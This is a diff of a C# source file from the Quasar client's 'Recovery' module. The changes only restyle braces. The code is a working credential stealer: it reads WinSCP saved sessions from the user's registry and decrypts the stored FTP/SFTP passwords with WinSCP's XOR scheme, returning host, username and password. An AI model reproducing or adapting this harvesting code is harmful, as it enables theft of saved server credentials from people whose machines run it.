@@ -6,23 +6,16 @@ using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
 using Quasar.Common.Models;
 
-namespace Quasar.Client.Recovery.FtpClients
-{
-    public class WinSCP
-    {
-        public static List<RecoveredAccount> GetSavedPasswords()
-        {
+namespace Quasar.Client.Recovery.FtpClients {
+    public class WinSCP {
+        public static List<RecoveredAccount> GetSavedPasswords() {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
-            try
-            {
+            try {
                 string regPath = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
 
-                using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
-                {
-                    foreach (String subkeyName in key.GetSubKeyNames())
-                    {
-                        using (RegistryKey accountKey = key.OpenReadonlySubKeySafe(subkeyName))
-                        {
+                using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath)) {
+                    foreach (String subkeyName in key.GetSubKeyNames()) {
+                        using (RegistryKey accountKey = key.OpenReadonlySubKeySafe(subkeyName)) {
                             if (accountKey == null) continue;
                             string host = accountKey.GetValueSafe("HostName");
                             if (string.IsNullOrEmpty(host)) continue;
@@ -35,8 +28,7 @@ namespace Quasar.Client.Recovery.FtpClients
                             if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(privateKeyFile))
                                 password = string.Format("[PRIVATE KEY LOCATION: \"{0}\"]", Uri.UnescapeDataString(privateKeyFile));
 
-                            data.Add(new RecoveredAccount
-                            {
+                            data.Add(new RecoveredAccount {
                                 Url = host,
                                 Username = user,
                                 Password = password,
@@ -46,33 +38,26 @@ namespace Quasar.Client.Recovery.FtpClients
                     }
                 }
                 return data;
-            }
-            catch
-            {
+            } catch {
                 return data;
             }
         }
 
-        static int dec_next_char(List<string> list)
-        {
+        static int dec_next_char(List<string> list) {
             int a = int.Parse(list[0]);
             int b = int.Parse(list[1]);
             int f = (255 ^ (((a << 4) + b) ^ 0xA3) & 0xff);
             return f;
         }
-        static string WinSCPDecrypt(string user, string pass, string host)
-        {
-            try
-            {
-                if (user == string.Empty || pass == string.Empty || host == string.Empty)
-                {
+        static string WinSCPDecrypt(string user, string pass, string host) {
+            try {
+                if (user == string.Empty || pass == string.Empty || host == string.Empty) {
                     return "";
                 }
                 string qq = pass;
                 List<string> hashList = qq.Select(keyf => keyf.ToString()).ToList();
                 List<string> newHashList = new List<string>();
-                for (int i = 0; i < hashList.Count; i++)
-                {
+                for (int i = 0; i < hashList.Count; i++) {
                     if (hashList[i] == "A")
                         newHashList.Add("10");
                     if (hashList[i] == "B")
@@ -101,13 +86,11 @@ namespace Quasar.Client.Recovery.FtpClients
                 newHashList3.Remove(newHashList3[0]);
                 newHashList3.Remove(newHashList3[0]);
                 int todel = dec_next_char(newHashList2) * 2;
-                for (int i = 0; i < todel; i++)
-                {
+                for (int i = 0; i < todel; i++) {
                     newHashList2.Remove(newHashList2[0]);
                 }
                 string password = "";
-                for (int i = -1; i < length; i++)
-                {
+                for (int i = -1; i < length; i++) {
                     string data = ((char)dec_next_char(newHashList2)).ToString();
                     newHashList2.Remove(newHashList2[0]);
                     newHashList2.Remove(newHashList2[0]);
@@ -118,9 +101,7 @@ namespace Quasar.Client.Recovery.FtpClients
                 password = password.Remove(0, sp);
                 password = password.Replace(splitdata, "");
                 return password;
-            }
-            catch
-            {
+            } catch {
                 return "";
             }
         }
